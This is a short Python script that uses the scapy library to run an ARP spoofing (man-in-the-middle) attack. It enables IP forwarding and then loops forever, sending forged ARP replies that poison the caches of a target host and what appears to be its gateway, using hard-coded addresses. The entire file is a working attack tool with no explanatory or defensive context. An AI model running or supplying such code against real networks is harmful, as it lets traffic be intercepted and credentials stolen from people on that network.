#! /usr/bin/env python

import subprocess
import time
import scapy.all as scap

def get_mac(ip):
    arp_request = scap.ARP(pdst=ip)
    broadcast = scap.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scap.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scap.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scap.send(packet)

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

while True:
    spoof("172.20.69.73", "172.20.69.1")
    spoof("172.20.69.1", "172.20.69.73")
    time.sleep(2)
    